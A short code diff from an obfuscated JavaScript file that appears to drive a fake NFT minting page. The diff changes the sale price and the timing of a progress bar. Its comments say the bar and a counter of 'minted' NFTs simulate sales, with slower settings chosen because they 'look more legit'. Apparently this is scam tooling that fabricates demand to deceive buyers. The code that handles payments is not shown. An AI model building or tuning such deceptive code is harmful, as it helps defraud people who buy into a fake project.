@@ -27,7 +27,7 @@ function _0x227f(_0x3622d9, _0x2c2f28) {
 	  1,
 	  10
 	],
-	price = 0.15,
+	price = 0.2,
     // don't know what this is
 	_0xec0157 = _0x520788(269),
     // amount is how many NFTs are being sold.
@@ -37,7 +37,7 @@ function _0x227f(_0x3622d9, _0x2c2f28) {
     // delay basically chooses how often the progress bar should increase in value, the time is in ms.
     // added chooses how many nfts that have been minted with a value between of 1-3 (slower is better, looks more legit if it's a smaller project)
 	delay = [
-	  1500,
+	  2000,
 	  4000
 	],
 	added = [
